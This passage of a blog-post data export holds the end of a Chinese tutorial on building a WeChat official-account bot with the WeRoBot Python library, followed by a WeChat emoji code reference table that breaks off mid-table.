= movie_name()\n    return name\n\n# blog 回复个人博客\n@robot.filter('blog')\ndef blog(message):\n    reply = ArticlesReply(message=message)\n    article = Article(\n        title=\"Lansonli\",\n        description=\"Lansonli个人博客\",\n        img=\"https://avatar.csdnimg.cn/0/0/A/3_xiaoweite1_1568355559.jpg\",\n        url=\"https://lansonli.blog.csdn.net\"\n    )\n    reply.add_article(article)\n    return reply\n\n# 匹配 音乐 回复一首歌\n@robot.filter('音乐')\ndef music(message):\n    music1 = music_data()\n    return music1\n\n# 匹配 fight 回复一句话\n@robot.filter('fight')\ndef fight(message):\n    data = get_fighttxt()\n    return data\n\n# 文本消息返回原文\n@robot.text\ndef echo(message):\n    return message.content\n\n# 其他消息返回\n@robot.handler\ndef hello(message):\n    return '(O_o)??'\n\nrobot.config['HOST'] = '0.0.0.0'\nrobot.config['PORT'] = 80\nrobot.run()\n\n\n</code></pre>\n\n<hr><p> </p>\n\n<p>分步讲解：</p>\n\n<p>公众号分为企业号、服务号和订阅号，我们这里用订阅号，适用于个人</p>\n\n<p>注册订阅号和购买服务器的过程不再赘述</p>\n\n<p> </p>\n\n<h3>1.验证服务器</h3>\n\n<p>在公众号后台配置服务器</p>\n\n<p><img alt=\"\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85NjkxNTY0LTZhMDY3MjI2MmExZWRiZjIucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvOTYwL2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>填入自己的服务器地址(URL)和Token：</p>\n\n<p>服务器地址可以是IP，也可以是域名，但必须以http://或https://开头，分别支持80端口和443端口。</p>\n\n<p>Token随便填，一会代码里用得到。</p>\n\n<p>选择明文模式，先不提交。</p>\n\n<p> </p>\n\n<p>服务器上部署代码</p>\n\n<p>先安装werobot</p>\n\n<p> </p>\n\n<pre>\n<code>pip install WeRoBot\n</code></pre>\n\n<p>创建 hello_world.py，代码如下：</p>\n\n<p> </p>\n\n<pre>\n<code>#coding:utf-8\n# Filename:hello_world.py\n# 验证服务器，并且收到的所有消息都回复'Hello World!'\n\nimport werobot\n\nrobot = werobot.WeRoBot(token='your token')\n\n# @robot.handler 处理所有消息\n@robot.handler\ndef hello(message):\n    return 'Hello World!'\n\n# 让服务器监听在 0.0.0.0:80\nrobot.config['HOST'] = '0.0.0.0'\nrobot.config['PORT'] = 80\nrobot.run()\n\n</code></pre>\n\n<p>'your token' 处填你的Token，然后运行</p>\n\n<p> </p>\n\n<pre>\n<code>python hello_world.py\n</code></pre>\n\n<p>返回公众号的基本配置页面，点击提交，如果没有报错就验证成功了，最后点击“启用配置”</p>\n\n<p> </p>\n\n<h3>2.处理文本消息</h3>\n\n<p> </p>\n\n<pre>\n<code># @robot.text 只处理文本消息\n@robot.text\ndef echo(message):\n    return '111'\n</code></pre>\n\n<p> </p>\n\n<h3>3.匹配文本的两种方式</h3>\n\n<p> </p>\n\n<pre>\n<code># 第一种方式\n@robot.text\ndef joke(message):\n    if message.content == \"joke\":\n# 如果把\"joke\"换成\"笑话\"就会报错，这种方式不能匹配中文\n\n# 第二种方式\n@robot.filter('笑话')\ndef joke(message):\n# 用 @robot.filter() 可以匹配中文\n</code></pre>\n\n<p> </p>\n\n<h3>4.读取本地文档</h3>\n\n<p> </p>\n\n<pre>\n<code># 以只读的方式，读取同目录文档 movies_name.txt 的内容\nfilename = 'movies_name.txt'\nf = open(filename, 'r')\ndata = f.read()\nf.close()\nreturn data\n</code></pre>\n\n<p> </p>\n\n<h3>5.回复图文消息</h3>\n\n<p> </p>\n\n<pre>\n<code># blog 回复个人博客\nfrom werobot.replies import ArticlesReply, Article\n@robot.filter('blog')\ndef blog(message):\n    reply = ArticlesReply(message=message)\n    article = Article(\n        title=\"v1coder\",  #标题\n        description=\"我的个人博客\",  #简介\n        img=\"https://*****.png\",  #图片链接\n        url=\"https://www.jianshu.com/u/7cb04d09491e\"  #点击图片后跳转链接\n    )\n    reply.add_article(article)\n    return reply\n</code></pre>\n\n<p> </p>\n\n<h3>6.回复音乐</h3>\n\n<p> </p>\n\n<pre>\n<code># 匹配 音乐 回复一首歌\n@robot.filter('音乐')\ndef music(message):\n    # 返回一个长度为四的列表\n    return [\n        '都选C',\n        '缝纫机乐队',\n        'https://files.catbox.moe/duefwe.mp3',\n        'https://files.catbox.moe/duefwe.mp3'\n    ]\n</code></pre>\n\n<p><br><br>\n分布讲解完毕。</p>\n\n<hr><p> </p>\n\n<h3>最后：</h3>\n\n<p>结束当前代码运行：<code>Ctrl + C</code></p>\n\n<p>使程序在Linux下后台运行 （关掉终端继续让程序运行）的方法：</p>\n\n<p> </p>\n\n<pre>\n<code>输入命令：\nnohup 你的shell命令 &amp;\n回车，使终端回到shell命令行\n</code></pre>\n\n<p>停止程序在 Linux 后台运行的方法：</p>\n\n<p> </p>\n\n<pre>\n<code>ps x  # 显示所有进程\n\nkill 进程号  # 结束进程\n</code></pre>\n\n<p><a href=\"https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login\" rel=\"nofollow\">公众号测试账号</a>，拥有所有权限</p>\n\n<p><a href=\"https://mp.weixin.qq.com/wiki?action=doc&amp;id=mp1433747234\" rel=\"nofollow\">全局返回码说明</a>，可以根据返回码信息调试接口，排查错误。</p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891288, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "微信默认表情符号的代码对照表(微信公众号使用到)", "log_Intro": "微信默认表情符号的代码对照表(微信公众号使用到)", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>先给大家推荐几个好玩的微信昵称工具：</p>\n\n<ul><li><a href=\"https://tool.wpjam.com/sup/\" rel=\"nofollow\">微信上标电话号码生成器</a></li>\n\t<li><a href=\"https://tool.wpjam.com/underline/\" rel=\"nofollow\">微信下划线昵称生成器</a></li>\n\t<li><a href=\"https://tool.wpjam.com/blue/\" rel=\"nofollow\">微信彩色昵称生成器</a></li>\n</ul><p>在微信用户可以发送表情符号，如下图：</p>\n\n<p><img alt=\"微信默认表情\" height=\"260\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy9lbW90aW9uLnBuZw?x-oss-process=image/format,png\" width=\"320\"></p>\n\n<p>这些符号公众平台是将其处理成文本，下面就列出微信默认表情符号代码对照表：</p>\n\n<table border=\"0\" cellspacing=\"0\"><thead><tr><th>表情图片</th>\n\t\t\t<th>字符串代码</th>\n\t\t\t<th>替换关键字</th>\n\t\t</tr></thead><tbody><tr><td><img alt=\"微笑\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8wLnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::)</td>\n\t\t\t<td>微笑</td>\n\t\t</tr><tr><td><img alt=\"伤心\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xLnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::~</td>\n\t\t\t<td>伤心</td>\n\t\t</tr><tr><td><img alt=\"美女\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yLnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::B</td>\n\t\t\t<td>美女</td>\n\t\t</tr><tr><td><img alt=\"发呆\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zLnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::|</td>\n\t\t\t<td>发呆</td>\n\t\t</tr><tr><td><img alt=\"墨镜\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80LnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:8-)</td>\n\t\t\t<td>墨镜</td>\n\t\t</tr><tr><td><img alt=\"哭\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81LnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::&lt;</td>\n\t\t\t<td>哭</td>\n\t\t</tr><tr><td><img alt=\"\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82LnBuZw?x-oss-process=image/format,png\"></td>\n\t\t\t<td>/::$</td>\n\t\t\t<td>羞</td>\n\t\t</tr><tr><td><img alt=\"哑\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy83LnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::X</td>\n\t\t\t<td>哑</td>\n\t\t</tr><tr><td><img alt=\"睡\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy84LnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::Z</td>\n\t\t\t<td>睡</td>\n\t\t</tr><tr><td><img alt=\"哭\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy85LnBuZw?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::’(</td>\n\t\t\t<td>哭</td>\n\t\t</tr><tr><td><img alt=\"囧\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xMC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::-|</td>\n\t\t\t<td>囧</td>\n\t\t</tr><tr><td><img alt=\"怒\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xMS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::@</td>\n\t\t\t<td>怒</td>\n\t\t</tr><tr><td><img alt=\"调皮\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xMi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::P</td>\n\t\t\t<td>调皮</td>\n\t\t</tr><tr><td><img alt=\"笑\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xMy5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::D</td>\n\t\t\t<td>笑</td>\n\t\t</tr><tr><td><img alt=\"惊讶\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xNC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::O</td>\n\t\t\t<td>惊讶</td>\n\t\t</tr><tr><td><img alt=\"难过\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xNS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::(</td>\n\t\t\t<td>难过</td>\n\t\t</tr><tr><td><img alt=\"酷\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xNi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::+</td>\n\t\t\t<td>酷</td>\n\t\t</tr><tr><td><img alt=\"汗\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xNy5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:–b</td>\n\t\t\t<td>汗</td>\n\t\t</tr><tr><td><img alt=\"抓狂\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xOC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::Q</td>\n\t\t\t<td>抓狂</td>\n\t\t</tr><tr><td><img alt=\"吐\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xOS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::T</td>\n\t\t\t<td>吐</td>\n\t\t</tr><tr><td><img alt=\"笑\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yMC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@P</td>\n\t\t\t<td>笑</td>\n\t\t</tr><tr><td><img alt=\"快乐\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yMS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@-D</td>\n\t\t\t<td>快乐</td>\n\t\t</tr><tr><td><img alt=\"奇\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yMi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::d</td>\n\t\t\t<td>奇</td>\n\t\t</tr><tr><td><img alt=\"傲\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yMy5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@o</td>\n\t\t\t<td>傲</td>\n\t\t</tr><tr><td><img alt=\"饿\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yNC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::g</td>\n\t\t\t<td>饿</td>\n\t\t</tr><tr><td><img alt=\"累\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yNS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:|-)</td>\n\t\t\t<td>累</td>\n\t\t</tr><tr><td><img alt=\"吓\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yNi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::!</td>\n\t\t\t<td>吓</td>\n\t\t</tr><tr><td><img alt=\"\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8xNy5wbmc?x-oss-process=image/format,png\"></td>\n\t\t\t<td>/::L</td>\n\t\t\t<td>汗</td>\n\t\t</tr><tr><td><img alt=\"高兴\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yOC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::&gt;</td>\n\t\t\t<td>高兴</td>\n\t\t</tr><tr><td><img alt=\"闲\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8yOS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::,@</td>\n\t\t\t<td>闲</td>\n\t\t</tr><tr><td><img alt=\"努力\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zMC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@f</td>\n\t\t\t<td>努力</td>\n\t\t</tr><tr><td><img alt=\"骂\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zMS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::-S</td>\n\t\t\t<td>骂</td>\n\t\t</tr><tr><td><img alt=\"疑问\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zMi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:?</td>\n\t\t\t<td>疑问</td>\n\t\t</tr><tr><td><img alt=\"秘密\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zMy5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@x</td>\n\t\t\t<td>秘密</td>\n\t\t</tr><tr><td><img alt=\"乱\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zNC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@@</td>\n\t\t\t<td>乱</td>\n\t\t</tr><tr><td><img alt=\"疯\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zNS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::8</td>\n\t\t\t<td>疯</td>\n\t\t</tr><tr><td><img alt=\"哀\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zNi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:,@!</td>\n\t\t\t<td>哀</td>\n\t\t</tr><tr><td><img alt=\"鬼\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zNy5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:!!!</td>\n\t\t\t<td>鬼</td>\n\t\t</tr><tr><td><img alt=\"打击\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zOC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:xx</td>\n\t\t\t<td>打击</td>\n\t\t</tr><tr><td><img alt=\"bye\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy8zOS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:bye</td>\n\t\t\t<td>bye</td>\n\t\t</tr><tr><td><img alt=\"汗\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80MC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:wipe</td>\n\t\t\t<td>汗</td>\n\t\t</tr><tr><td><img alt=\"抠\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80MS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:dig</td>\n\t\t\t<td>抠</td>\n\t\t</tr><tr><td><img alt=\"鼓掌\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80Mi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:handclap</td>\n\t\t\t<td>鼓掌</td>\n\t\t</tr><tr><td><img alt=\"糟糕\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80My5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:&amp;-(</td>\n\t\t\t<td>糟糕</td>\n\t\t</tr><tr><td><img alt=\"恶搞\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80NC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:B-)</td>\n\t\t\t<td>恶搞</td>\n\t\t</tr><tr><td><img alt=\"什么\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80NS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:&lt;@</td>\n\t\t\t<td>什么</td>\n\t\t</tr><tr><td><img alt=\"什么\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80Ni5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:@&gt;</td>\n\t\t\t<td>什么</td>\n\t\t</tr><tr><td><img alt=\"累\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80Ny5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::-O</td>\n\t\t\t<td>累</td>\n\t\t</tr><tr><td><img alt=\"看\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80OC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:&gt;-|</td>\n\t\t\t<td>看</td>\n\t\t</tr><tr><td><img alt=\"难过\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy80OS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:P-(</td>\n\t\t\t<td>难过</td>\n\t\t</tr><tr><td><img alt=\"难过\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81MC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::’|</td>\n\t\t\t<td>难过</td>\n\t\t</tr><tr><td><img alt=\"坏\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81MS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:X-)</td>\n\t\t\t<td>坏</td>\n\t\t</tr><tr><td><img alt=\"亲\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81Mi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/::*</td>\n\t\t\t<td>亲</td>\n\t\t</tr><tr><td><img alt=\"吓\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81My5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:@x</td>\n\t\t\t<td>吓</td>\n\t\t</tr><tr><td><img alt=\"可怜\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81NC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:8*</td>\n\t\t\t<td>可怜</td>\n\t\t</tr><tr><td><img alt=\"刀\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81NS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:pd</td>\n\t\t\t<td>刀</td>\n\t\t</tr><tr><td><img alt=\"水果\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81Ni5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:&lt;W&gt;</td>\n\t\t\t<td>水果</td>\n\t\t</tr><tr><td><img alt=\"酒\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81Ny5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:beer</td>\n\t\t\t<td>酒</td>\n\t\t</tr><tr><td><img alt=\"篮球\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81OC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:basketb</td>\n\t\t\t<td>篮球</td>\n\t\t</tr><tr><td><img alt=\"乒乓\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy81OS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:oo</td>\n\t\t\t<td>乒乓</td>\n\t\t</tr><tr><td><img alt=\"咖啡\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82MC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:coffee</td>\n\t\t\t<td>咖啡</td>\n\t\t</tr><tr><td><img alt=\"美食\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82MS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:eat</td>\n\t\t\t<td>美食</td>\n\t\t</tr><tr><td><img alt=\"动物\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82Mi5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:pig</td>\n\t\t\t<td>动物</td>\n\t\t</tr><tr><td><img alt=\"鲜花\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82My5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:rose</td>\n\t\t\t<td>鲜花</td>\n\t\t</tr><tr><td><img alt=\"枯\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82NC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:fade</td>\n\t\t\t<td>枯</td>\n\t\t</tr><tr><td><img alt=\"唇\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82NS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:showlove</td>\n\t\t\t<td>唇</td>\n\t\t</tr><tr><td><img alt=\"爱\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82Ni5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:heart</td>\n\t\t\t<td>爱</td>\n\t\t</tr><tr><td><img alt=\"分手\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82Ny5wbmc?x-oss-process=image/format,png\" 